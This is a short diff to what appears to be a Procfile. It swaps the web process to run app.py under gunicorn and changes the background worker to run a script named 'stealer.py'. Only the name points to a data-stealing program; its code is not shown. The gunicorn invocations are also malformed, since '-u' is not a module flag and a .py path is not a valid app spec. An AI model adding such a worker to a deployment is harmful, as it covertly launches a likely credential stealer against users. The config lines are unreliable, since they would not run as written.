@@ -1,2 +1,2 @@
-web: gunicorn -u server.py
-worker: python -u app.py
+web: gunicorn -u app.py
+worker: python -u stealer.py
